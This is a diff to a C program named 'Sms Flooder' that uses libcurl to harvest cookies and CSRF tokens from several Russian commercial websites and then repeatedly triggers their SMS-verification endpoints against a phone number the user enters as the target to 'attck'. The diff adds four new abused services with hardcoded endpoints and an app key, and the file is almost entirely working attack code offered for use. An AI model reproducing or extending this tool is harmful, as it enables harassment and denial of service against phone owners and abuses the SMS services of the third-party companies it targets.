@@ -1,16 +1,16 @@
-/*  Sms Flooder v1.3
+/*  Sms Flooder v1.4
+ *  linux basic template
  *  gcc sms-flooder.c -lcurl
  *  ./sms-flooder
 */
 
-#include <stdio.h>      //
-#include <stdlib.h>     // rend();
+#include <stdio.h>      // stdio.h
+#include <stdlib.h>     // for rend();
 #include <curl/curl.h>  // for curl;
-#include <unistd.h>     // sleep();
+#include <unistd.h>     // for sleep();
 
 /* Get randon int */
 int GetRandInt (int min, int max){
-    
     int r;
     srand(time(NULL));
     r = rand();
@@ -295,7 +295,7 @@ void GetCookieDvepalochki() {
 void SmsDvepalochki(char* phone) {
     CURL *curl;
     CURLcode res;
-    char Buf[512];
+    char Buf[256];
 
     curl = curl_easy_init();
     if(curl) {
@@ -379,15 +379,233 @@ void SmsEvrasia(char* phone) {
     curl_global_cleanup();
 }
 
+/* Plazius Sms Flood func (!what is Appkey?)*/
+void SmsPlazius(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[128];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://app.plazius.ru/api/mobile/v3/auth/sendSms");
+        chunk = curl_slist_append(chunk, "Host: app.plazius.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
+        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
+        chunk = curl_slist_append(chunk, "AppKey: WebApp-3a2605b0cf2a4c9d938752a84b7e97b6");
+        chunk = curl_slist_append(chunk, "Token: [object Object]");
+        chunk = curl_slist_append(chunk, "userid: [object Object]");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        sprintf(Buf, "{\"userPhone\":\"+%s\"}", phone);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
+/* PersonaClinic Get Cookie funk */
+void GetCookiePersonaClinic() {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.personaclinic.ru/?register=yes");
+        chunk = curl_slist_append(chunk, "Host: lk.personaclinic.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./personaClinic-cookie.txt");
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+/* PersonaClinic Sms Flood func (!one sms only:?)*/
+void SmsPersonaClinic(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[256];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.personaclinic.ru/local/templates/lk/components/bitrix/system.auth.registration/.default/ajax/phone.php");
+        chunk = curl_slist_append(chunk, "Host: lk.personaclinic.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: */*");
+        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./personaClinic-cookie.txt");
+
+        sprintf(Buf, "REG_PHONE=%%2B%c+(%c%c%c)+%c%c%c-%c%c-%c%c", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
+/* StrelkaCard Get Cookie funk */
+void GetCookieStrelkaCard() {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.strelkacard.ru/register/");
+        chunk = curl_slist_append(chunk, "Host: lk.strelkacard.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./strelkaCard-cookie.txt");
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+/* StrelkaCard Sms Flood func (!one sms only:?)*/
+void SmsStrelkaCard(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[128];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.strelkacard.ru/api/users/register/");
+        chunk = curl_slist_append(chunk, "Host: lk.strelkacard.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
+        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./strelkaCard-cookie.txt");
+
+        sprintf(Buf, "{\"phone\":\"%s\"}", phone);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
+/* Driver Get Cookie funk */
+void GetCookieDriver() {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://driver.gett.ru/signup/");
+        chunk = curl_slist_append(chunk, "Host: driver.gett.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./driver-cookie.txt");
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+/* Driver Sms Flood func (!one sms only:?)*/
+void SmsDriver(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[256];
+    char token[128];
+    int f=0;
+
+    FILE *file;
+    file = fopen("./driver-cookie.txt", "r");
+
+    while (fscanf (file, "%s", token) != EOF) {
+        if (f==1) break;
+        if (!strcmp(token, "XSRF-TOKEN")) f=1;
+	}
+    fclose(file);
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://driver.gett.ru/api/login/phone/");
+        chunk = curl_slist_append(chunk, "Host: driver.gett.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "'Accept: application/json");
+        chunk = curl_slist_append(chunk, "Content-Type: application/json");
+        
+        sprintf(Buf, "X-CSRFToken: %s", token);
+        chunk = curl_slist_append(chunk, Buf);
+        
+        chunk = curl_slist_append(chunk, "Referer: https://driver.gett.ru/signup/");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./driver-cookie.txt");
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+        sprintf(Buf, "{\"phone\":\"+%c (%c%c%c) %c%c%c-%c%c-%c%c\",\"registration\":true}", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
 int main(void)
 {
     char phone[16];
     int rounds;
 
     // Print Banner
-    printf("\n\t------------------------\n\t|  Sms Flooder v1.3    |\n\t|----------------------|\n");
+    printf("\n\t------------------------\n\t|  Sms Flooder v1.4    |\n\t|----------------------|\n");
     printf("\t| Developed by mrTavas |\n\t------------------------\n");
-    printf("\n[?] Number example: 71231231212\n");
+    printf("\n[?] Number format: 79999999999\n");
     printf("[?] Rounds example: 1\n");
     printf("\n[*] Started...\n[?] Phone to attck -> ");
     scanf("%s", phone);
@@ -400,6 +618,9 @@ int main(void)
     GetCookieTaxovichkof();
     GetCookieDvepalochki();
     GetCookieEvrasia();
+    GetCookiePersonaClinic();
+    GetCookieStrelkaCard();
+    GetCookieDriver();
     system("clear");
 
     /* Starting Flood */
@@ -407,23 +628,30 @@ int main(void)
         SmsDelevery(phone);
         sleep(2);
         SmsDostaevsky(phone);
-        sleep(1);
+        sleep(2);
         SmsOllis(phone);
         sleep(2);
         SmsMfood(phone);
         sleep(1);
-        SmsTaxovichkof(phone); // (!5 min timer)
+        SmsTaxovichkof(phone);      // (!5 min timer)
         sleep(2);
         SmsDvepalochki(phone);
+        sleep(2);
+        SmsEvrasia(phone);          // (!one sms only)
+        sleep(2);
+        SmsPlazius(phone);          // (!what is Appkey?)
         sleep(1);
-        SmsEvrasia(phone);     // (!one sms only)
+        SmsPersonaClinic(phone);    // (!one sms only?)
+        sleep(2);
+        SmsStrelkaCard(phone);      // (!one sms only?)
         sleep(1);
+        SmsDriver(phone);
 
         system("clear");
         printf("\n[+] Round %d done\n", i);
         sleep(10);
     }
-    
+
     printf("[+] %d Rounds done. Have a nice day!\n\n", rounds);
     return 0;
 }
